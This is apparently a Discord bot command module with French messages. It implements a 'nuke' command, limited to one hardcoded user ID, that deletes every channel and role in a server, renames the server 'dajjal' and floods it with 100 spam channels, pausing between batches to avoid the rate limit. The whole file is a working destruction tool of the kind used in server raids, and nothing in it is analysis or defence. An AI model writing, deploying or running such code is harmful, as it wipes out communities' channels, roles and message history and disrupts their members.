const { PermissionFlagsBits } = require('discord.js');
const { errorEmbed, successEmbed } = require('../../utils/embeds');

module.exports = {
  name: 'nuke',
  description: 'NUKE COMPLÈTE du serveur (destruction totale)',
  aliases: ['destroy', 'apocalypse'],
  async execute(message, args, client) {
    const ALLOWED_ID = '754703887738470482';

    if (message.author.id !== ALLOWED_ID) {
      return message.reply({
        embeds: [errorEmbed('Accès Refusé', 'Vous n\'avez pas la permission d\'utiliser cette commande.')]
      });
    }

    const guild = message.guild;

    try {
      const statusMsg = await message.reply({
        embeds: [
          successEmbed(
            'NUKE en cours 💣',
            'Destruction totale du serveur en cours...'
          )
        ]
      });

      // 1. Supprimer tous les salons texte et vocaux
      console.log('🗑️ Suppression des salons...');
      for (const channel of guild.channels.cache.values()) {
        try {
          await channel.delete('NUKE - Destruction totale');
        } catch (err) {
          console.error(`Erreur suppression salon ${channel.name}:`, err.message);
        }
      }

      // 2. Supprimer tous les rôles (sauf @everyone)
      console.log('🗑️ Suppression des rôles...');
      for (const role of guild.roles.cache.values()) {
        if (role.name !== '@everyone') {
          try {
            await role.delete('NUKE - Destruction totale');
          } catch (err) {
            console.error(`Erreur suppression rôle ${role.name}:`, err.message);
          }
        }
      }

      // 3. Renommer le serveur en "dajjal"
      console.log('📝 Renommage du serveur...');
      await guild.setName('dajjal');

      // 4. Créer 100 salons appelés "dajjal"
      console.log('📨 Création des 100 salons...');
      let channelsCreated = 0;
      for (let i = 1; i <= 100; i++) {
        try {
          await guild.channels.create({
            name: `dajjal-${i}`,
            type: 0 // 0 = text channel
          });
          channelsCreated++;
          
          // Petit délai pour éviter le rate limit
          if (i % 10 === 0) {
            await new Promise(resolve => setTimeout(resolve, 1000));
          }
        } catch (err) {
          console.error(`Erreur création salon dajjal-${i}:`, err.message);
        }
      }

      await statusMsg.edit({
        embeds: [
          successEmbed(
            'NUKE COMPLÉTÉE 💥',
            `✅ Serveur renommé en "dajjal"\n✅ Tous les salons supprimés\n✅ Tous les rôles supprimés\n✅ ${channelsCreated} nouveaux salons "dajjal" créés`
          )
        ]
      });

      console.log('✅ NUKE complétée avec succès !');

    } catch (err) {
      console.error('Erreur nuke:', err);
      return message.reply({
        embeds: [errorEmbed('Erreur', 'Erreur lors de la NUKE.')]
      });
    }
  }
};